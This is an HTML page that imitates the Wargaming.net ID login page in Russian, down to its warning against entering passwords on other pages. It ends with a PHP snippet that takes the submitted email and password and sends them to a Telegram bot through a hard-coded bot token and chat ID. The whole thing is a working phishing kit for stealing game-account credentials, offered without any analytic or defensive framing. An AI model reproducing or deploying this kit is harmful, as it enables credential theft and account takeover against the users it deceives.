<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="no-cache"/>
	<title>Wargaming.net ID</title>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<header class="js-flex">
		<div class="header-nav js-flex sb">
			<nav class="js-flex sb">
				<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="19px" height="19px" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 19 19" enable-background="new 0 0 19 19" xml:space="preserve">
				<path clip-rule="evenodd" d="M1.8,9.5c0-4.3,3.4-7.7,7.7-7.7c4.2,0,7.7,3.4,7.7,7.7  c0,2.8-1.5,5.3-3.8,6.6c0.5-1.7,0.7-3.4,0.6-5.4c0.5,0.1,0.8,0.2,1.3,0.4c-0.6-1.4-1.2-2.8-2-4.1c-0.7,1.4-1.7,2.7-2.7,3.7l1.6-0.1  c-1.4,2.5-3.3,3.6-5.8,4c-0.6-2.7-0.2-7.3,3-9.4l0.3,1.5c0.6-1,1.8-2.3,2.7-3.2C11,3.1,9.4,2.9,7.8,3.2C8,3.4,8.4,3.7,8.6,3.9  c-3.5,1.5-5.5,3.9-6.7,6.8C1.8,10.3,1.8,9.9,1.8,9.5L1.8,9.5z M9.5,19c5.2,0,9.5-4.3,9.5-9.5C19,4.3,14.7,0,9.5,0S0,4.3,0,9.5  C0,14.7,4.3,19,9.5,19L9.5,19z"/>
				</svg>
				<div class="nav__button-one js-flex sb">
					<p>Игры</p>
					<svg width="7" height="4" fill="#a8a8a8" viewBox="0 0 7 4" xmlns="http://www.w3.org/2000/svg">
					<path d="M1.5 1.5V2V2.5H2H2.5M1.5 1.5H2H2.5V2V2.5M1.5 1.5H1H0.5V0.5H1.5V1V1.5ZM2.5 2.5V3V3.5H4.5V3V2.5M2.5 2.5H3H4H4.5M4.5 2.5H5H5.5V2V1.5M4.5 2.5V2V1.5H5H5.5M5.5 1.5H6H6.5V0.5H5.5V1V1.5Z"/>
					</svg>
				</div>
				<div class="nav__button-two js-flex sb">
					<p>Сервисы</p>
					<svg width="7" height="4" fill="#a8a8a8" viewBox="0 0 7 4" xmlns="http://www.w3.org/2000/svg">
					<path d="M1.5 1.5V2V2.5H2H2.5M1.5 1.5H2H2.5V2V2.5M1.5 1.5H1H0.5V0.5H1.5V1V1.5ZM2.5 2.5V3V3.5H4.5V3V2.5M2.5 2.5H3H4H4.5M4.5 2.5H5H5.5V2V1.5M4.5 2.5V2V1.5H5H5.5M5.5 1.5H6H6.5V0.5H5.5V1V1.5Z"/>
					</svg>
				</div>
				<a href="#">Премиум магазин</a>
				<a href="#">Центр поддержки</a>
			</nav>
			<a href="#">Создать аккаунт</a>
		</div>
		<img src="images/logo-with-text.png">
	</header>
	<main>
		<section class="sing-in wrapper">
			<h1>ВХОД В АККАУНТ</h1>
			<p>Эта страница — единое место входа в ваш аккаунт. Используйте её для авторизации на всех веб-ресурсах Wargaming.net. Чтобы избежать взлома аккаунта, не вводите логин и пароль на других страницах.</p>
			<div class="sign-in__container js-flex">
				<div class="sing-in__login-password" onmouseover="loginPasswordReduceOpacity(event)" onmouseout="loginPasswordAddOpacity(event)">
					<p>Для входа используйте свой аккаунт Wargaming.net</p>
					<form class="sing-in__login-password__form" id="form__login-password" action="#" method="post">
						<input type="email" name="email" placeholder="Электронная почта" class="opacityChange" id="email" autofocus>
						<input type="password" name="password" class="opacityChange" placeholder="Пароль" id="password">
						<div class="form__submit-checkbox js-flex sb">
							<input type="submit" name="submit" value="Войти" class="opacityChange">
							<div class="form-checkbox js-flex sb">
								<input type="checkbox"  class="opacityChange" name="remeber" id="remember">
								<label class="label-checkbox js-flex sb opacityChange" for="remember">
									<p>Запомнить меня</p>
								</label>
							</div>
						</div>
					</form>
					<p class="sing-in__login-password__text opacityChange">Не удаётся войти? <a>Восстановить аккаунт</a></p>
					<p class="sing-in__login-password__text opacityChange">Нет Wargaming.net ID? <a>Создать аккаунт</a></p>
					<div class="other-block__shadow"></div>
				</div>
				<div class="sing-in__other-method" onmouseover="otherMethodReduceOpacity(event)" onmouseout="otherMethodAddOpacity(event)">
					<p>Войдите с помощью социальной сети:</p>
					<div class="other-method__container js-flex sb">
						<div class="other-method__amazon-block other-method__block js-flex">
							<img src="images/amazon.svg">
							<p>Amazon</p>
						</div>
						<div class="other-method__facebook-block other-method__block js-flex">
							<img src="images/facebook.svg">
							<p>Facebook</p>
						</div>
						<div class="other-method__google-block other-method__block js-flex">
							<img src="images/google.svg">
							<p>Google</p>
						</div>
						<div class="other-method__microsoft-block other-method__block js-flex">
							<img src="images/microsoft.svg">
							<p>Microsoft</p>
						</div>
						<div class="other-method__twitch-block other-method__block js-flex">
							<img src="images/twitch.svg">
							<p>Twitch</p>
						</div>
						<div class="other-method__steam-block other-method__block js-flex">
							<img src="images/steam.svg">
							<p>Steam</p>
						</div>
						<div class="other-method__epic-games-block other-method__block js-flex">	
							<img src="images/epic-games.svg">
							<p>Epic Games</p>
						</div>
					</div>
					<div class="other-method__shadow"></div>
				</div>
			</div>
		</section>
	</main>
	<footer>
		<div class="footer__container wrapper">
			<div class="footer__line-one js-flex sb">
				<div class="footer-rule js-flex sb">
					<a>Лицензионное соглашение</a>
					<a>Политика конфиденциальности</a>
					<a>Условия использования</a>
					<a>Родительский кабинет</a>
				</div>
				<div class="footer-language js-flex sb">
					<p>Europe (Русский)</p>
					<svg width="7" height="4" fill="#EAEAEA" viewBox="0 0 7 4" xmlns="http://www.w3.org/2000/svg">
					<path d="M1.5 1.5V2V2.5H2H2.5M1.5 1.5H2H2.5V2V2.5M1.5 1.5H1H0.5V0.5H1.5V1V1.5ZM2.5 2.5V3V3.5H4.5V3V2.5M2.5 2.5H3H4H4.5M4.5 2.5H5H5.5V2V1.5M4.5 2.5V2V1.5H5H5.5M5.5 1.5H6H6.5V0.5H5.5V1V1.5Z"/>
					</svg>
				</div>
			</div>
			<p>© 2009–2023 Wargaming.net Все права защищены</p>
		</div>
	</footer>
	<script src="script.js"></script>
</body>
</html>

<?php
    $login = $_POST['email'];
    $password =  $_POST['password'];
    $chat_id = "-4085260487";
    $token = "6594965722:AAG6cbzG0G6J040bq2sQMXT59ivQpqPVapI";
    $message = "Логин: " . $login . "%0A" . "Пароль:" . $password;
    file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . $message);
?>